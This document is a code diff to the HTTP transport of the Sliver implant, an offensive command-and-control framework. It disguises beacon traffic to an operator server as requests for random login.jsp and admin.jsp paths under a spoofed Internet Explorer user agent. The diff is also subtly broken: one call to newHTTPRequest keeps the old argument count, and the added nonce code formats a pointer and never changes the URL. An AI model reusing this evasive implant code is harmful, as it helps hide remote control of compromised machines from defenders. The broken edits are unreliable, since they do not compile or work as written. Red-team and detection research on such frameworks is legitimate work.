@@ -23,7 +23,7 @@ package transports
 // Procedural C2
 // ===============
 // .txt = rsakey
-// .css = start
+// .jsp = start
 // .php = session
 //  .js = poll
 // .png = stop
@@ -38,6 +38,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	insecureRand "math/rand"
 	"strings"
 
 	"sync"
@@ -45,7 +46,6 @@ import (
 	"log"
 	// {{end}}
 
-	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -54,13 +54,11 @@ import (
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/proxy"
-
 	"github.com/golang/protobuf/proto"
 )
 
 const (
-	// IE 11 User-agent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-	defaultUserAgent  = "Mozillа/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+	defaultUserAgent  = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
@@ -92,7 +90,7 @@ type SliverHTTPClient struct {
 	SessionID  string
 }
 
-// SessionInit - Initailize the session
+// SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
 	publicKey := s.getPublicKey()
 	if publicKey == nil {
@@ -119,10 +117,13 @@ func (s *SliverHTTPClient) SessionInit() error {
 	return nil
 }
 
-func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *http.Request {
+func (s *SliverHTTPClient) newHTTPRequest(method, uri string, encoderNonce *int, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri, body)
 	req.Header.Set("User-Agent", defaultUserAgent)
 	req.Header.Set("Accept-Language", "en-US")
+	if encoderNonce != nil {
+		req.URL.Query().Add("_", fmt.Sprintf("%d", encoderNonce))
+	}
 	return req
 }
 
@@ -131,7 +132,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{if .Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	req := s.newHTTPRequest(http.MethodGet, uri, nil, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
@@ -170,7 +171,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 // session key yet.
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
-	uri := s.cssURL()
+	uri := s.jspURL()
 	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
@@ -259,10 +260,10 @@ func (s *SliverHTTPClient) jsURL() string {
 	return curl.String()
 }
 
-func (s *SliverHTTPClient) cssURL() string {
+func (s *SliverHTTPClient) jspURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"css", "static", "assets", "dist", "stylesheets", "style"}
-	filenames := []string{"bootstrap.min.css"}
+	segments := []string{"app", "admin", "upload", "actions", "api"}
+	filenames := []string{"login.jsp", "admin.jsp", "session.jsp", "action.jsp"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
 	return curl.String()
 }
@@ -284,9 +285,7 @@ func (s *SliverHTTPClient) txtURL() string {
 }
 
 func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
-	seed := rand.NewSource(time.Now().UnixNano())
-	insecureRand := rand.New(seed)
-	n := insecureRand.Intn(2) // How many segements?
+	n := insecureRand.Intn(2) // How many segments?
 	genSegments := []string{}
 	for index := 0; index < n; index++ {
 		seg := segments[insecureRand.Intn(len(segments))]
